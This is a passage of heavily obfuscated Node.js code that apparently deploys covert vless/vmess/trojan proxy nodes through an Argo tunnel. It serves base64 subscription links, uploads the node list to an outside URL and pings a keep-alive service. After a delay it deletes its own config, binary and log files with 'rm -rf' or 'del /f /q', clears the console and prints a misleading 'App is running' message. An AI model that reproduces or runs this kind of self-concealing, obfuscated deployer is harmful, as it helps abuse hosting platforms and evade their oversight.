Promise(_0x20b7a5=>{const _0x22e7aa={_0x597ad6:0xb3};setTimeout(()=>{const _0x3da969=_0xab85,_0x56572f={'v':'2','ps':''+_0x8063c6,'add':CFIP,'port':CFPORT,'id':UUID,'aid':'0','scy':_0x3da969(_0x21a547._0xb34747),'net':'ws','type':_0x3da969(0x109),'host':_0x3b5ddc,'path':'/vmess-argo?ed=2560','tls':_0x3da969(0x76),'sni':_0x3b5ddc,'alpn':'','fp':_0x3da969(0xa6)},_0x303f5f=_0x3da969(0x129)+UUID+'@'+CFIP+':'+CFPORT+_0x3da969(0xd5)+_0x3b5ddc+_0x3da969(0xdb)+_0x3b5ddc+'&path=%2Fvless-argo%3Fed%3D2560#'+_0x8063c6+_0x3da969(_0x21a547._0x1cbd32)+Buffer['from'](JSON[_0x3da969(0xd0)](_0x56572f))[_0x3da969(0x80)]('base64')+_0x3da969(0xe4)+UUID+'@'+CFIP+':'+CFPORT+_0x3da969(_0x21a547._0x3d5da5)+_0x3b5ddc+_0x3da969(0xdb)+_0x3b5ddc+'&path=%2Ftrojan-argo%3Fed%3D2560#'+_0x8063c6+_0x3da969(0xea);console[_0x3da969(_0x21a547._0x390f35)](Buffer['from'](_0x303f5f)[_0x3da969(0x80)]('base64')),fs['writeFileSync'](subPath,Buffer[_0x3da969(0x8e)](_0x303f5f)['toString'](_0x3da969(0xe1))),console[_0x3da969(_0x21a547._0x1ad8a7)](FILE_PATH+_0x3da969(0xcd)),uploadNodes(),app[_0x3da969(0x9c)]('/'+SUB_PATH,(_0x162f72,_0x5b6015)=>{const _0x17b67e=_0x3da969,_0x2a9dbe=Buffer['from'](_0x303f5f)['toString']('base64');_0x5b6015['set']('Content-Type',_0x17b67e(_0x22e7aa._0x597ad6)),_0x5b6015[_0x17b67e(0x88)](_0x2a9dbe);}),_0x20b7a5(_0x303f5f);},0x7d0);});}}async function uploadNodes(){const _0x42318d={_0x35b2e7:0x70,_0x2826cc:0xe0,_0x20b9ea:0x107,_0x3d2fbb:0xd1,_0x1024f4:0x11d,_0x250058:0xce,_0x5ccfd6:0x87,_0x34ed20:0xd0,_0x3e5ef5:0x10a},_0x59bd37=_0x44c7a7;if(UPLOAD_URL&&PROJECT_URL){const _0x3ea090=PROJECT_URL+'/'+SUB_PATH,_0x50c0c0={'subscription':[_0x3ea090]};try{const _0x568f6d=await axios[_0x59bd37(0x123)](UPLOAD_URL+_0x59bd37(_0x42318d._0x35b2e7),_0x50c0c0,{'headers':{'Content-Type':'application/json'}});return _0x568f6d&&_0x568f6d[_0x59bd37(0x108)]===0xc8?(console[_0x59bd37(_0x42318d._0x2826cc)]('Subscription\x20uploaded\x20successfully'),_0x568f6d):null;}catch(_0x5ba08c){if(_0x5ba08c[_0x59bd37(_0x42318d._0x20b9ea)]){if(_0x5ba08c[_0x59bd37(0x107)][_0x59bd37(0x108)]===0x190){}}}}else{if(UPLOAD_URL){if(!fs['existsSync'](listPath))return;const _0x49c615=fs[_0x59bd37(_0x42318d._0x3d2fbb)](listPath,_0x59bd37(_0x42318d._0x1024f4)),_0x55a3b3=_0x49c615[_0x59bd37(_0x42318d._0x250058)]('\x0a')[_0x59bd37(0x90)](_0x280f8f=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x59bd37(0x93)](_0x280f8f));if(_0x55a3b3[_0x59bd37(_0x42318d._0x5ccfd6)]===0x0)return;const _0x4439df=JSON[_0x59bd37(_0x42318d._0x34ed20)]({'nodes':_0x55a3b3});try{const _0x568d41=await axios['post'](UPLOAD_URL+'/api/add-nodes',_0x4439df,{'headers':{'Content-Type':_0x59bd37(0xc7)}});return _0x568d41&&_0x568d41[_0x59bd37(0x108)]===0xc8?(console[_0x59bd37(_0x42318d._0x2826cc)](_0x59bd37(_0x42318d._0x3e5ef5)),_0x568d41):null;}catch(_0x25ff0e){return null;}}else return;}}function _0xab85(_0x2c11e3,_0x1d593e){const _0x59ded6=_0x59de();return _0xab85=function(_0xab8594,_0x2caeb8){_0xab8594=_0xab8594-0x6c;let _0x3454ed=_0x59ded6[_0xab8594];return _0x3454ed;},_0xab85(_0x2c11e3,_0x1d593e);}function cleanFiles(){const _0x119a97={_0x8b1555:0xcb,_0x1d1ae1:0xd9,_0x4ba83b:0xcf};setTimeout(()=>{const _0x4a436b={_0x205501:0xe0,_0x3af6a6:0xcc},_0x4d5981={_0x36011c:0xa7,_0xa41ba1:0xe0,_0x47628a:0xe0,_0x3d90b6:0xcc},_0x450f25=_0xab85,_0x40ee91=[bootLogPath,configPath,webPath,botPath];if(NEZHA_PORT)_0x40ee91[_0x450f25(_0x119a97._0x8b1555)](npmPath);else NEZHA_SERVER&&NEZHA_KEY&&_0x40ee91['push'](phpPath);process[_0x450f25(0xaa)]===_0x450f25(0xb7)?exec('del\x20/f\x20/q\x20'+_0x40ee91['join']('\x20')+_0x450f25(_0x119a97._0x1d1ae1),_0x3928ed=>{const _0x37d05e=_0x450f25;console[_0x37d05e(_0x4d5981._0x36011c)](),console[_0x37d05e(_0x4d5981._0xa41ba1)](_0x37d05e(0xb5)),console[_0x37d05e(_0x4d5981._0x47628a)](_0x37d05e(_0x4d5981._0x3d90b6));}):exec('rm\x20-rf\x20'+_0x40ee91['join']('\x20')+_0x450f25(_0x119a97._0x4ba83b),_0xfb5607=>{const _0x2c9069=_0x450f25;console['clear'](),console[_0x2c9069(_0x4a436b._0x205501)]('App\x20is\x20running'),console['log'](_0x2c9069(_0x4a436b._0x3af6a6));});},0x15f90);}cleanFiles();async function AddVisitTask(){const _0x4f7f91={_0x1fcce3:0x102,_0x1e9870:0xe0,_0x4cfc9a:0x9e,_0x5da6a3:0xd3},_0x5b7bd3=_0x44c7a7;if(!AUTO_ACCESS||!PROJECT_URL){console[_0x5b7bd3(0xe0)](_0x5b7bd3(0xb6));return;}try{const _0x1eb8dc=await axios[_0x5b7bd3(0x123)](_0x5b7bd3(_0x4f7f91._0x1fcce3),{'url':PROJECT_URL},{'headers':{'Content-Type':_0x5b7bd3(0xc7)}});return console[_0x5b7bd3(_0x4f7f91._0x1e9870)](_0x5b7bd3(_0x4f7f91._0x4cfc9a)),_0x1eb8dc;}catch(_0x550cc8){return console[_0x5b7bd3(0xbf)](_0x5b7bd3(0xd4)+_0x550cc8[_0x5b7bd3(_0x4f7f91._0x5da6a3)]),null;}}async function startserver(){const _0x16a9bd={_0x334d9e:0x115},_0x5d9ff8=_0x44c7a7;try{argoType(),deleteNodes(),cleanupOldFiles(),await generateConfig(),await downloadFilesAndRun(),await extractDomains(),await AddVisitTask();}catch(_0x5c018b){console['error'](_0x5d9ff8(_0x16a9bd._0x334d9e),_0x5c018b);}}startserver()[_0x44c7a7(0x119)](_0x3734e2=>{const _0xb7f663=_0x44c7a7;console[_0xb7f663(0xbf)]('Unhandled\x20error\x20in\x20startserver:',_0x3734e2);}),app[_0x44c7a7(0xfd)](PORT,()=>console[_0x44c7a7(0xe0)](_0x44c7a7(0xbe)+PORT+'!'));
